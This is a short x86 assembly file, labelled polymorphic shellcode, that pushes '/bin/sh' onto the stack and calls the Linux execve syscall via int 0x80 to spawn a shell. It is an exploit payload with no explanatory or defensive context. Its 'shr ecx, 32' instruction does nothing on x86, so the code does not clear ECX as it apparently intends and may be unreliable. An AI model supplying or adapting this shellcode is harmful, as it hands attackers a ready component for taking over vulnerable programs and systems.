; polymorphic shellcode(formatted to intel syntax)

global _start
section .text

_start:
	shr ecx, 32
	mul ecx
	mov esi, 0x68732f2f
	shr esi, 8
	push esi
	push 0x6e69622f
	mov ebx, esp
	add eax, 11
	int 0x80
